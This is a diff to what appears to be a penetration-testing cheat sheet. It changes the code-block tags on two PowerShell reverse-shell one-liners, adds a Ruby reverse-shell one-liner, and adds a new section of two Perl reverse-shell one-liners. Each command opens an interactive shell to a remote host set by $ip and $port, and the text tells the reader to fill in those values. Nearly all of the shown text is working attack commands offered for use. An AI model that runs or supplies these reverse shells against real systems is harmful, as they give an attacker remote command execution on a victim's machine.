@@ -14,11 +14,11 @@ TODO: description and methodology for each section \(as needed\); Fix code examp
 
 ### **PowerShell Reverse Shells**
 
-```text
+```bash
 powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("$ip",$port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
-```text
+```bash
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('$ip',$port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
@@ -36,7 +36,19 @@ C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect((ip
 
 ```ruby
 ruby -rsocket -e 'c=TCPSocket.new("$ip","$port");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+ruby -rsocket -e 'f=TCPSocket.open("$ip","$port").to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ```
+
+### Perl Reverse Shells
+
+```perl
+perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"$ip:$port");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
+perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($port,inet_aton($ip)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};’
+```
+
+* The variables `$ip` and `$port` need to be customized.  `$ip` must be a string, `$port` must be an integer.
 
 ### Meterpreter Reverse Shells
 
